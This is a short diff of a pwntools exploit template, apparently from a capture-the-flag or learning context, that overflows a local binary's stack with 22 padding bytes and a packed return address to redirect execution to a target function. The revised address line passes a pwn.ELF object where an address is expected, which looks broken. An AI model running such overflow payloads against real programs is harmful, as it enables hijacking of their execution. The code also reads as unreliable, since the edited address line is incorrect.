@@ -18,9 +18,9 @@ def only_if_external(data):
  
 context.bits = 32 #if 32 bit or 64 bit binary
  
-vul = 0x00001353  #address of the first line of target function.
+addr = pwn.ELF("<binary file name>")  #address of the target function.
  
-payload = b"A"*22 + p32(vul) + b"\n" #creating payload. the number of A's is found by using pattern offset. use p64 for 64 bit
+payload = b"A"*22 + p32(addr) + b"\n" #creating payload. the number of A's is found by using pattern offset. use p64 for 64 bit
  
 p = process("./<binary file name>") 
 p.send(payload) 
